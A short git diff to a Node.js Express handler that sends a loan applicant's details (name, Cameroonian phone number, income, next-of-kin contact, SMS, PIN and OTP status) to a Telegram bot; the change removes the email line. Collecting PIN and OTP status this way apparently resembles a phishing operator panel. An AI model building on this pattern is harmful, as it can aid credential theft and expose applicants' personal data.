@@ -543,7 +543,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     }
                     
                     await sendTelegramMessage(
-                        `🔍 *APPLICATION DETAILS* 🔍\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${searchId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +237${app.phone}\n📧 Email: ${app.email}\n💰 Amount: XAF ${app.loanAmount.toLocaleString()}\n📅 Term: ${app.loanTerm}\n📌 Purpose: ${app.loanPurpose || 'Not specified'}\n💼 Employment: ${app.employment || 'Not specified'}\n💰 Income: XAF ${(app.annualIncome || 0).toLocaleString()}\n👨‍👩‍👦 Kin: ${app.kinName || 'Not specified'} (+237${app.kinPhone || ''})\n\n📨 SMS: ${app.smsStatus}\n🔐 PIN: ${app.pinStatus}\n🔑 OTP: ${app.otpStatus}\n🔄 Resubmissions: ${app.resubmissionCount || 0}`
+                        `🔍 *APPLICATION DETAILS* 🔍\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${searchId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +237${app.phone}\n💰 Amount: XAF ${app.loanAmount.toLocaleString()}\n📅 Term: ${app.loanTerm}\n📌 Purpose: ${app.loanPurpose || 'Not specified'}\n💼 Employment: ${app.employment || 'Not specified'}\n💵 Income: XAF ${(app.annualIncome || 0).toLocaleString()}\n👨‍👩‍👦 Kin: ${app.kinName || 'Not specified'} (+237${app.kinPhone || ''})\n\n📨 SMS: ${app.smsStatus}\n🔐 PIN: ${app.pinStatus}\n🔑 OTP: ${app.otpStatus}\n🔄 Resubmissions: ${app.resubmissionCount || 0}`
                     );
                     return res.sendStatus(200);
                 }
